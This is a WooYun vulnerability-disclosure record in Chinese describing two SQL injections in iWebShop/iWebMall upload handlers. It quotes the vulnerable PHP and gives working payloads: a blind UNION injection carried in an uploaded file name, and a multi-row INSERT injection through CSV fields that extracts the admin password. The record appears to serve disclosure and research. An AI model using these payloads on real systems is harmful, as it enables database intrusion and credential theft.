{"id": 68985, "wybug_id": "wooyun-2015-0129660", "wybug_title": "iWebShop最新版两处SQL注入", "wybug_corp": "www.jooyea.cn", "wybug_author": "小飞", "wybug_date": "2015-07-27 14:05", "wybug_open_date": "2015-10-25 15:01", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向公众公开  简要描述： iWebShop最新版7月26号从官网下载一处bool盲注 一处insert注入（其中的一个注入条件 GPC=OFF） 详细说明：  注入一问题出在action/goods/csv_taobao_img.php\n$dbo=new dbex();\tdbtarget('r',$dbServs);\t$file_name=explode(\".\",$_FILES[$upload_name]['name'][0]);\t/** 根据图片名称获取相应的商品id,是否首图 */\t$tmpsql=\"select goods_id,is_set,id from $t_tmp_img where img='\".$file_name[0].\"'\";    $tmpimg= $dbo->getRow($tmpsql);\tif(!isset($tmpimg['goods_id'])||!$tmpimg['goods_id']){\t\tHandleError(\"此文件不在csv上传列表中\");\t\texit;\t}\n首先说下iwebshop的防护机制，iWebShop实际上对所有GET POST 的' \\都进行了全局过滤但是管理员忽略了FILES而php对FILES是不进行魔术引号转义的（真的是这样么?真的测试过么?）。$file_name=explode(\".\",$_FILES[$upload_name]['name'][0]);这里获取上传的文件名以文件名作为索引查询数据库从而，我们在文件名引入单引号首先注册登录http://127.0.0.1/iwebmall/modules.php?app=csv_taobao_img然后上传一个1'.tbi的文件 数据库显示为\n\n这里我们可以看到，我们成功引入单引号。而iWebShop的getRow是不打印mysql_error的\npublic function getRow($sql) {\t\t$result=mysql_query($sql) or die('false getRow, Sql:'.$sql);\t\treturn mysql_fetch_array($result);\t}\n所以我们通过布尔盲注来解决。\nif(!isset($tmpimg['goods_id'])||!$tmpimg['goods_id']){\t\tHandleError(\"此文件不在csv上传列表中\");\t\texit;\t}\n这里我们构造返回的goods_id是否唯一 就能知道查询的正确与否新建文件 文件名为\nfei' union select substring((select version()),1,1)=5,2,3#.tbi\n上传显示正常 说明version字段第一位为5数据库执行如下\n\n如果改成4\nfei' union select substring((select version()),1,1)=4,2,3#.tbi\n前端报错\n\n注入二问题出在action/goods/csv_taobao.php\n$dbo = new dbex;\tdbtarget(\"w\",$dbServs);\t\t$row=get_shop_info($dbo,$t_shop_info,$shop_id);\t//取得上传的csv文件\t$arr=get_csv_date($_FILES['filename']['tmp_name']);\t\t$errstr=\"\";\t$goods_num=$row['goods_num'];\tforeach ($arr as $k=> $value){\t\t$sql=\"insert into $t_goods (shop_id,goods_name,cat_id,ucat_id,type_id,goods_intro,goods_number,goods_price,is_delete,is_best,is_new,is_hot,is_promote,is_on_sale,is_set_image,goods_thumb,add_time,last_update_time,lock_flg) values \";\t    $sql.=\"('$shop_id','\".$value['goods_name'].\"','$cat_id','0','1','\".$value['goods_intro'].\"','\".$value['goods_number'].\"','\".$value['goods_price'].\"',\t              '1','0','0','0','0','1','0','','\".date(\"Y-m-d H:i:s\").\"','\".date(\"Y-m-d H:i:s\").\"','0')\";\t    $up=$dbo->exeUpdate($sql);\n同样的问题，由于太信任上传过程直接用get_csv_date来解析这个上传文件我们看看这个函数\n/**\t * 解析csv文件\t */\tfunction get_csv_date($file_name){\t\t$str = file_get_contents($file_name);        if($str{0} != \"\\xFF\" || $str{1} != \"\\xFE\"){            return false;        }        //转码        $str = unicodeToUtf8(substr($str, 2));        //切割字符串        $str = preg_replace('/\\t\\\"([^\\t]+?)\\\"\\t/es', \"'\\t\\\"' . stripslashes(str_replace(\\\"\\n\\\", \\\"\\\", '\\\\1')) . '\\\"\\t'\", $str);        $csv_array = explode(\"\\n\", $str);        unset($csv_array[count($csv_array) -1]);        unset($csv_array[0]);        $product_array = array();        if (!empty($csv_array)){        \t        \tforeach ($csv_array as $k => $v){//        \t\tif ($k > $this->product_batch_num){//判断上传数量不能大于指定数量//        \t\t\tbreak;//        \t\t}        \t\t$tmp = explode(\"\\t\", $v);        \t\t//商品名称        \t\t$tmp['goods_name'] = str_replace(\"'\",'',str_replace('\"','',$tmp[0]));        \t\t//库存        \t\t$tmp['goods_number'] = intval($tmp[9]);        \t\t//商品价格        \t\t$tmp['goods_price'] = number_format($tmp[7],2);        \t\t        \t\tif(trim($tmp[35],'\"') != ''){\t\t\t\t\t//图片\t\t\t\t\t$tmp['image'] = trim($tmp[35],'\"');\t\t\t\t}\t\t\t\t//商品简介        \t\t$tmp['goods_intro'] = str_replace(\"'\",'',str_replace('\"','',$tmp[24]));        \t\t$product_array[] = $tmp;        \t}        }        return $product_array;\t}\n可以看到 对注入的检测在于str_replace(\"'\",'',str_replace('\"','',$tmp[0]));可是这个update点是多字段可控，我们可以引入\\转义掉单引号来注入insert into iwebmaill_goods (shop_id,goods_name,cat_id,ucat_id,type_id,goods_intro,goods_number,goods_price,is_delete,is_best,is_new,is_hot,is_promote,is_on_sale,is_set_image,goods_thumb,add_time,last_update_time,lock_flg) values('$shop_id','\".$value['goods_name'].\"','$cat_id','0','1','\".$value['goods_intro'].\"','\".$value['goods_number'].\"','\".$value['goods_price'].\"',\t              '1','0','0','0','0','1','0','','\".date(\"Y-m-d H:i:s\").\"','\".date(\"Y-m-d H:i:s\").\"','0')\"$value['goods_intro']填入\\ ，goods_number 填入\",1,1,1,1 ,1,1,1,1,1,1),(1,(select admin_password from imall_admin_user limit 1),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)\"使得语句变成insert (x,x,x,x,x,x,x,x),(x,evil sql,x,x,x,x,x,x,x);这样插入两条数据 最终得到管理员密码\n\n 成功注入   漏洞证明：  新建文件 文件名为\nfei' union select substring((select version()),1,1)=5,2,3#.tbi\n上传显示正常 说明version字段第一位为5数据库执行如下\n\n如果改成4\nfei' union select substring((select version()),1,1)=4,2,3#.tbi\n前端报错\n\n$value['goods_intro']填入\\ ，goods_number 填入\",1,1,1,1 ,1,1,1,1,1,1),(1,(select admin_password from imall_admin_user limit 1),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)\"使得语句变成insert (x,x,x,x,x,x,x,x),(x,evil sql,x,x,x,x,x,x,x);这样插入两条数据 最终得到管理员密码\n\n   修复方案：  注意FILES转义   版权声明：转载请注明来源 小飞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-25 15:01 厂商回复： 该问题是iwebmall 而不是最新的iwebshop的产品 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}